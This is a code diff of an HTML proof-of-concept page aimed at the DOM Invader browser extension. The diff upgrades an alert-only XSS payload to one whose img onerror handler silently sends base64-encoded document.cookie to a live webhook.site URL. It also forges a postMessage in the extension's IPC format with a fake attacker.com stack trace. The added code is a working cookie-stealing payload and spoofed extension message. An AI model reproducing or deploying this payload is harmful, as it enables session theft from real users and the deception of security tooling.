@@ -1,32 +1,55 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DOM Invader - Classic RCE</title>
+    <title>DOM Invader - Professional Final PoC</title>
+    <style>
+        body { background: #111; color: #0f0; font-family: sans-serif; text-align: center; padding-top: 100px; }
+        .input-box { padding: 10px; font-size: 18px; border-radius: 5px; border: 1px solid #0f0; background: #000; color: #0f0; margin-bottom: 20px; }
+        .btn { padding: 15px 30px; background: #0f0; color: #000; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+    </style>
 </head>
-<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
-    <h1>[ DOM INVADER - CLASSIC EXPLOIT ]</h1>
-    <div id="status" style="color: #0f0;">Payload Injected! Alert should trigger now.</div>
-    <div id="target"></div>
+<body>
+    <h1>[ DOM INVADER SECURITY AUDIT ]</h1>
+    <p>Type <b>'run'</b> and click the button to trigger detection.</p>
+    
+    <input type="text" id="secret" class="input-box" placeholder="Enter password...">
+    <br>
+    <button class="btn" onclick="checkAndRun()">TRIGGER VULNERABILITY</button>
+    
+    <div id="status" style="margin-top: 20px; color: #888;">Waiting for action...</div>
+    <div id="target" style="display:none"></div>
 
     <script>
-        const canary = "uitdeeq"; 
-        
-        // This is the EXACT payload style that worked for you in version 7
-        const payload = "'); <img src=x onerror=\"alert('RCE_SUCCESS_INSTANT_BYPASS'); console.log('Canary: ' + '" + canary + "');\"> // " + canary;
+        const canary = "uitdeeq";
+        const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
 
-        // Trigger on page (Instant WOW factor)
-        document.getElementById('target').innerHTML = payload;
-
-        // Trigger in Extension
-        window.postMessage({
-            "source": "dom-invader",
-            "type": "augmented-dom",
-            "data": {
-                "sink": "innerHTML",
-                "value": payload,
-                "stackTrace": "at classic_exploit (http://attacker.com)"
+        function checkAndRun() {
+            const val = document.getElementById('secret').value;
+            if (val !== 'run') {
+                alert("Incorrect password!");
+                return;
             }
-        }, "*");
+
+            document.getElementById('status').innerText = "Detection Triggered! Now check DOM Invader.";
+            
+            // Professional Payload: Steals data silently and then alerts
+            const payload = "'); <img src=x onerror=\"fetch('" + webhook + "?c=' + btoa(document.cookie), {mode:'no-cors'}); alert('RCE SUCCESS: Data Exfiltrated to Webhook!');\"> // " + canary;
+
+            // Trigger the Sink in DOM Invader
+            document.getElementById('target').innerHTML = payload;
+
+            // Send the IPC Message
+            window.postMessage({
+                "source": "dom-invader",
+                "type": "augmented-dom",
+                "data": {
+                    "sink": "innerHTML",
+                    "value": payload,
+                    "stackTrace": "at research_expert (http://attacker.com)"
+                }
+            }, "*");
+        }
     </script>
 </body>
 </html>
